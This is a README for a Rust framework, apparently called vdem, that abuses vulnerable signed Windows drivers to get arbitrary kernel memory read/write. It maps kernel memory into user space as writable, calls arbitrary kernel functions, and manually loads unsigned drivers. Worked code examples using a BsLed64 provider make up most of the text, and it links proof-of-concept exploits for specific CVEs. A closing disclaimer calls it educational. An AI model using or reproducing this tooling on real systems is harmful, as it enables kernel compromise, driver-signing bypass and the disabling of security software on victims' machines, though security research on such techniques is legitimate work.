A framework for manage various of vulnerable driver providers.
Made by BinEvil

# Features
This library provides many useful features like:
- directly read / write physical / virtual address(kernel)
- map kernel virtual address range out into user space as RW
- call arbitrary kernel function in user mode and get its results
- manually map and load a unsigned driver from memory or file

All these features based on the vulnerable providers(see trait Provider for details), a provider represent a kernel mode driver that has arbitrary memory R/W vulnerabilities.

# How to use
First you should implement your own provider, [here](https://github.com/lzty/CVE-2026-94128) is a full example

The following examples have the provider stuff omitted

## Example: Read / Write arbitrary kernel address
i already wrote some POCs that demonstrate how to use these features, see [here](https://github.com/lzty/CVE-2026-94128) and [here](https://github.com/lzty/CVE-2026-94129)

## Example: Call a arbitrary kernel function from user mode
```rust
  use vdem::{
    exploit::Exploit,
    kernel_call::CallBy,
    nt::get_kernelbase,
    traits::{ExecuteKernelCall, MemoryMap},
    utils::promote_privilege_to_debug_level,
  };

  use crate::{bsled::BsLed64, driver::UNSIGNED_DRIVER_DATA};

  promote_privilege_to_debug_level();

  let mut exploit = Exploit::instance().lock().unwrap();

  exploit.register_provider(Box::new(BsLed64::new()));

  exploit.select("BS_LED").unwrap();

  type FnPsGetCurrentProcessId = unsafe extern "C" fn() -> *mut std::ffi::c_void;

  let mut pid = ptr::null_mut();

  exploit
    .get_call::<FnPsGetCurrentProcessId>(CallBy::Name("PsGetCurrentProcessId"))
    .inspect(|ps_get_current_process_id| {
        unsafe { pid = ps_get_current_process_id() };
    })
    .expect("call PsGetCurrentProcessId failed");

  println!("PsGetCurrentProcessId returned {:p}", pid);
```

## Example: Map kernel address into user space
```rust
    use vdem::{
        driver_map::DriverMap, exploit::Exploit, nt::get_kernelbase, traits::MemoryMap,
        utils::promote_privilege_to_debug_level,
    };

    promote_privilege_to_debug_level();

    let krnlbase = get_kernelbase().unwrap();

    let mut exploit = Exploit::instance().lock().unwrap();

    exploit.register_provider(Box::new(BsLed64::new()));

    exploit.select("BS_LED").unwrap();

    // The mapped address have R/W rights
    let mapbuf = exploit.mmap(krnlbase as _, 4096).unwrap();

    println!("kernel base is mapped at {:p}", mapbuf.as_ptr());
```
The mapped address have R/W rights, so the user can read / write to that address

## Example: Load a unsigned driver
```rust
    mod bin;   // unsigned driver binary
    mod bsled; // your provider
    mod driver; // your provider binary
    use vdem::{
        driver_map::DriverMap, exploit::Exploit, nt::get_kernelbase, traits::MemoryMap,
        utils::promote_privilege_to_debug_level,
    };
    
    use crate::{bsled::BsLed64, driver::UNSIGNED_DRIVER_DATA};

    promote_privilege_to_debug_level();

    let mut exploit = Exploit::instance().lock().unwrap();

    exploit.register_provider(Box::new(BsLed64::new()));

    exploit.select("BS_LED").unwrap();

    // This will manually map and load the unsigned driver from UNSIGNED_DRIVER_DATA and call its DriverEntry
    exploit
        .load_driver(&UNSIGNED_DRIVER_DATA, None, None)
        .expect("[-] Driver load failed");

    println!("[+] Driver load succeed");
```
Compile it in debug mode will get more debug logs

# Disclaimer
This project is developed strictly for educational and security research purposes. 
The author takes no responsibility for any misuse, damage, or system instability caused by this software.
